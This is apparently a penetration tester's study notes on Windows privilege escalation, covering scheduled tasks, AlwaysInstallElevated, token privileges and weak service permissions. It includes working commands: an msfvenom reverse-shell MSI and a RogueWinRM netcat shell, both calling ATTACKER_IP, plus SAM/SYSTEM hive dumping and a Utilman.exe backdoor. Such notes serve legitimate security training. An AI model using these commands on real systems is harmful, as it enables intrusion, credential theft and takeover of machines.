You can [[Password Harvesting|harvest passwords]] in Windows then use these to escalate or run commands.
## Scheduled tasks
Scheduled tasks can be used to escalate privileges. Check `schtasks` for an item whose binary is missing, or current user has permissions to edit.

`schtasks /query /tn <task> /fo list /v` for detailed view of a service.
`icacls <FilePath>` to check file permissions

# Permissions
## AlwaysInstallElevated
This is a setting that forces .msi files to be run/installed as a privileged account. This could allow for generation of a malicious MSI to run with admin privs.

Requires two registry settings:
```powershell
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Generate malicious MSI:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

## SeBackup / SeRestore
These privs allow users to read/write to any file, regardless of DACL. Idea is to allow certain users to backup the system without requiring full admin privs. For example, member of the "Backup Operators" group.

```shell-session
reg save hklm/system C:\Users\target\system.hive
reg save hklm/sam C:\Users\target\sam.hive
```

You can then use [[Hash Attacks]] to retrieve the hashes from the hive and pass the hash.

## SeTakeOwnership
Allows a user to take ownership of any object on the system, including files/registry keys.

Example attack: search for service running as SYSTEM, take ownership of the binary, change it to a shell.

Using Utilman.exe for execution vector (which is the accessibility button on login screen):
```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <local_admin>:F
copy cmd.exe utilman.exe
```

## SeImpersonate / SeAssignPrimaryToken
These allow processes to impersonate other users, acting on their behalf. For example, ftp uses impersonation.

![[Token-based Impersonation.png]]
`LOCAL SERVICE` and `NETWORK SERVICE ACCOUNTS` have this priv. User `iis apppool\defaultapppool` also has it.

### Exploiting
To exploit, we need:
1. Spawn a process for users to connect and authenticate to it
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process

`RogueWinRM` is useful for this. Exploit is possible b/c when a user starts BITS it connects to 5985 (WinRM service) using SYSTEM. If WinRM is stopped, we can replace with RogueWinRM

1. Start listener `nc -lvp 4442` on attacking machine
2. Start RogueWinRM
```cmd
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

# Services
`sc qc <service>` shows details about a specified service
Service configs are stored in `HKLM\SYSTEM\CurrentControlSet\Services\`

### Insecure permissions on service executable
If the binary for a service has weak perms or can be modified/replaced, we can gain service account privs.

### Unquoted service paths
If a service path is not quoted, SCM doesn't know how to parse a space. Is it a command + arguments? All one command?

### Insecure Service Permissions
Sysinternals tool `accesschk64.exe -qlc <service>` can be used to identify if a service DACL grants vulnerable account the `SERVICE_ALL_ACCESS` permission, which allows changing of a service including binary.

